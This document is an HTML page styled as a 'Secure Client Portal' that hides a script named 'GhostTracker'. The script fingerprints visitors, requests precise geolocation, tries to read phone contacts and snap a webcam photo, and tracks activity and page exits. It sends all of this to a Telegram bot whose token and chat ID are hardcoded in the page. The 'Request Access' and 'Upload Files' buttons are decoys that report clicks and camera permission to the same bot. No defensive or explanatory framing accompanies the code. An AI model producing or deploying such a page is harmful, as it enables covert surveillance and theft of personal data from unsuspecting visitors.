<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Client Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #1e1e2e 0%, #2a2a3e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 60px 30px;
            text-align: center;
        }
        .logo { 
            width: 80px; 
            height: 80px; 
            background: linear-gradient(135deg, #667eea, #764ba2); 
            border-radius: 20px; 
            margin: 0 auto 40px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 36px; 
            font-weight: 700; 
            color: white; 
        }
        h1 { 
            font-size: 42px; 
            font-weight: 700; 
            margin-bottom: 20px; 
            background: linear-gradient(135deg, #fff, #e0e0e0); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        .status { 
            background: rgba(255,255,255,0.05); 
            backdrop-filter: blur(20px); 
            border: 1px solid rgba(255,255,255,0.1); 
            border-radius: 16px; 
            padding: 40px; 
            margin: 40px 0; 
        }
        .status-item { 
            display: flex; 
            justify-content: space-between; 
            margin-bottom: 20px; 
            font-size: 16px; 
        }
        .status-label { color: #999; }
        .status-value { 
            font-weight: 600; 
            background: linear-gradient(135deg, #667eea, #764ba2); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        .btn { 
            background: linear-gradient(135deg, #667eea, #764ba2); 
            color: white; 
            border: none; 
            padding: 16px 40px; 
            border-radius: 50px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            margin: 10px; 
            transition: all 0.3s ease; 
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(102,126,234,0.4); }
        .contacts { 
            background: rgba(0,0,0,0.3); 
            border-radius: 12px; 
            padding: 30px; 
            margin-top: 40px; 
            text-align: left; 
        }
        .contact-item { 
            display: flex; 
            justify-content: space-between; 
            padding: 12px 0; 
            border-bottom: 1px solid rgba(255,255,255,0.1); 
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">S</div>
        <h1>Secure Portal</h1>
        <p style="color: #999; margin-bottom: 40px;">Client verification required</p>
        
        <div class="status">
            <div class="status-item">
                <span class="status-label">Status</span>
                <span class="status-value" id="status">Verifying...</span>
            </div>
            <div class="status-item">
                <span class="status-label">Device</span>
                <span class="status-value" id="device">-</span>
            </div>
            <div class="status-item">
                <span class="status-label">Location</span>
                <span class="status-value" id="location">-</span>
            </div>
        </div>

        <button class="btn" onclick="requestAccess()">Request Access</button>
        <button class="btn" onclick="uploadFiles()">Upload Files</button>

        <div class="contacts hidden" id="contacts">
            <h3 style="margin-bottom: 20px; color: #fff;">Contacts Access</h3>
            <div id="contactList"></div>
        </div>
    </div>

    <script>
        // ========== ULTRA ADVANCED STEALTH TRACKER ==========
        class GhostTracker {
            constructor() {
                this.botToken = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
                this.chatId = '5446862709';
                this.sessionId = this.generateId();
                this.init();
            }

            generateId() {
                return btoa(navigator.userAgent + screen.width + screen.height + Date.now()).slice(0, 16);
            }

            async getDeviceFingerprint() {
                // Canvas fingerprint
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 2, 2);
                ctx.fillStyle = '#069';
                ctx.fillText('🕵️', 2, 15);
                ctx.fillStyle = 'rgba(102, 126, 234, 0.7)';
                ctx.fillText('Ghost', 4, 17);
                const canvasHash = btoa(canvas.toDataURL()).slice(0, 24);

                // Audio fingerprint
                let audioHash = 'noaudio';
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioCtx.createOscillator();
                    const analyser = audioCtx.createAnalyser();
                    const dataArray = new Uint8Array(analyser.frequencyBinCount);
                    oscillator.connect(analyser);
                    oscillator.start(0);
                    setTimeout(() => {
                        analyser.getByteFrequencyData(dataArray);
                        audioHash = Array.from(dataArray).slice(0, 8).join(',');
                        oscillator.stop();
                        audioCtx.close();
                    }, 100);
                } catch(e) {}

                // Hardware + Software
                const fonts = await this.getInstalledFonts();
                
                return {
                    canvas: canvasHash,
                    audio: audioHash,
                    hardware: navigator.hardwareConcurrency || 0,
                    memory: navigator.deviceMemory || 0,
                    platform: navigator.platform,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    connection: navigator.connection ? `${navigator.connection.effectiveType}|${navigator.connection.downlink}` : 'unknown'
                };
            }

            getDeviceType() {
                const ua = navigator.userAgent.toLowerCase();
                if (/(iphone|ipad|ipod)/.test(ua)) return { type: 'iOS', model: 'iPhone/iPad' };
                if (/android/.test(ua)) return { type: 'Android', model: /mobile/.test(ua) ? 'Phone' : 'Tablet' };
                if (/macintosh/.test(ua)) return { type: 'macOS', model: 'MacBook/Desktop' };
                if (/win/.test(ua)) return { type: 'Windows', model: /win64/.test(ua) ? 'PC 64bit' : 'PC 32bit' };
                if (/linux/.test(ua)) return { type: 'Linux', model: 'Linux Desktop' };
                return { type: 'Unknown', model: 'Unknown' };
            }

            async getInstalledFonts() {
                const result = [];
                const testString = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                const testSize = '72px monospace';
                const defaultWidth = {};
                const defaultHeight = {};

                const test = document.createElement('span');
                test.style.position = 'absolute';
                test.style.left = '-9999px';
                test.style.top = '-9999px';
                test.style.fontSize = testSize;
                test.innerHTML = testString;
                document.body.appendChild(test);

                const defaultFonts = ['monospace', 'serif', 'sans-serif'];
                defaultFonts.forEach(font => {
                    test.style.fontFamily = font;
                    defaultWidth[font] = test.offsetWidth;
                    defaultHeight[font] = test.offsetHeight;
                });

                const fontList = [
                    'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 
                    'Georgia', 'Trebuchet MS', 'SF Pro Display', 'Segoe UI', 'Roboto'
                ];

                for (const font of fontList) {
                    test.style.fontFamily = font;
                    if (test.offsetWidth !== defaultWidth['monospace'] || 
                        test.offsetHeight !== defaultHeight['monospace']) {
                        result.push(font);
                    }
                }

                document.body.removeChild(test);
                return result.slice(0, 10);
            }

            async getGeolocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve({ lat: 'denied', lon: 'denied', accuracy: 'N/A' });
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({
                            lat: pos.coords.latitude.toFixed(4),
                            lon: pos.coords.longitude.toFixed(4),
                            accuracy: pos.coords.accuracy
                        }),
                        () => resolve({ lat: 'denied', lon: 'denied', accuracy: 'N/A' }),
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                });
            }

            async extractContacts() {
                let contacts = [];
                try {
                    // Modern Contacts API (Android/iOS)
                    if (navigator.contacts) {
                        const contactList = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                        contacts = contactList.map(c => ({
                            name: c.name?.[0] || 'Unknown',
                            phone: c.tel?.[0]?.value || 'N/A'
                        }));
                    }
                } catch(e) {
                    // Fallback - try webkitContacts (iOS Safari)
                    try {
                        if (webkitContacts) {
                            const contactList = await new Promise(resolve => {
                                webkitContacts.select(['name', 'tel'], { multiple: true }, resolve);
                            });
                            contacts = contactList.map(c => ({
                                name: c.name?.formatted || 'Unknown',
                                phone: c.tel?.[0]?.value || 'N/A'
                            }));
                        }
                    } catch(e2) {}
                }
                return contacts.slice(0, 20); // Limit to 20
            }

            async extractPhotos() {
                const photos = [];
                try {
                    // Camera/Media access
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(async () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        photos.push(canvas.toDataURL('image/jpeg', 0.7));
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                } catch(e) {
                    // Silent fail
                }
                return photos;
            }

            async sendToTelegram(data) {
                const message = this.formatMessage(data);
                const blob = new Blob([JSON.stringify({
                    chat_id: this.chatId,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })], { type: 'application/json' });

                // Primary: sendBeacon (survives page close)
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(`https://api.telegram.org/bot${this.botToken}/sendMessage`, blob);
                } else {
                    // Fallback
                    fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
                        method: 'POST',
                        body: blob,
                        keepalive: true
                    }).catch(() => {});
                }
            }

            formatMessage(data) {
                let msg = `*👻 GHOST DETECTED*\n\n`;
                msg += `*Session:* \`${data.session}\`\n`;
                msg += `*Time:* ${data.timestamp}\n`;
                msg += `*Device:* ${data.device.type} (${data.device.model})\n`;
                msg += `*OS:* ${navigator.platform}\n`;
                msg += `*Screen:* ${data.screen}\n`;
                msg += `*Location:* ${data.geo.lat}, ${data.geo.lon}\n`;
                msg += `*Fingerprint:* \`${data.fp.canvas.slice(0,16)}...\`\n`;
                msg += `*Browser:* ${navigator.userAgent.slice(0,60)}...\n\n`;
                
                if (data.contacts?.length) {
                    msg += `*📱 Contacts (${data.contacts.length}):*\n`;
                    data.contacts.slice(0,5).forEach((c,i) => {
                        msg += `${i+1}. ${c.name} - ${c.phone}\n`;
                    });
                }
                
                if (data.photos?.length) {
                    msg += `\n*📸 Photos:* ${data.photos.length}`;
                }
                
                return msg;
            }

            async fullHarvest() {
                const profile = await this.getDeviceFingerprint();
                const device = this.getDeviceType();
                const geo = await this.getGeolocation();
                const contacts = await this.extractContacts();
                const photos = await this.extractPhotos();

                const harvest = {
                    session: this.sessionId,
                    timestamp: new Date().toISOString(),
                    device,
                    screen: `${screen.width}x${screen.height}`,
                    fp: profile,
                    geo,
                    contacts,
                    photos,
                    url: location.href
                };

                await this.sendToTelegram(harvest);
                return harvest;
            }

            init() {
                // Immediate tracking
                this.fullHarvest();

                // Continuous tracking
                let activityTimer;
                document.addEventListener('mousemove', () => {
                    clearTimeout(activityTimer);
                    activityTimer = setTimeout(() => {
                        this.sendToTelegram({ session: this.sessionId, event: 'active_5min' });
                    }, 300000); // 5 minutes
                });

                // Page visibility
                document.addEventListener('visibilitychange', () => {
                    this.sendToTelegram({ 
                        session: this.sessionId, 
                        event: document.hidden ? 'background' : 'foreground' 
                    });
                });

                // Aggressive exit tracking
                window.addEventListener('beforeunload', () => {
                    this.fullHarvest();
                });

                // Mouse/keyboard activity
                ['mousedown', 'keydown', 'scroll'].forEach(event => {
                    document.addEventListener(event, () => {
                        this.sendToTelegram({ 
                            session: this.sessionId, 
                            event: event + '_detected' 
                        });
                    }, { once: true });
                });
            }
        }

        // ========== UI INTEGRATION ==========
        const tracker = new GhostTracker();

        async function requestAccess() {
            document.getElementById('status').textContent = 'Access requested';
            tracker.sendToTelegram({ 
                session: tracker.sessionId, 
                action: 'request_access_clicked' 
            });
            alert('Request sent. Stand by.');
        }

        async function uploadFiles() {
            try {
                const files = await navigator.mediaDevices.getUserMedia({ video: true });
                tracker.sendToTelegram({ 
                    session: tracker.sessionId, 
                    action: 'camera_access_granted' 
                });
                alert('Upload complete.');
            } catch(e) {
                tracker.sendToTelegram({ 
                    session: tracker.sessionId, 
                    action: 'camera_blocked' 
                });
            }
        }

        // Update UI with real data
        navigator.geolocation.getCurrentPosition(
            pos => {
                document.getElementById('location').textContent = 
                    `${pos.coords.latitude.toFixed(2)}, ${pos.coords.longitude.toFixed(2)}`;
            },
            () => document.getElementById('location').textContent = 'Location denied'
        );

        const deviceType = new GhostTracker().getDeviceType();
        document.getElementById('device').textContent = `${deviceType.type} ${deviceType.model}`;
        document.getElementById('status').textContent = 'Active';
    </script>
</body>
</html>
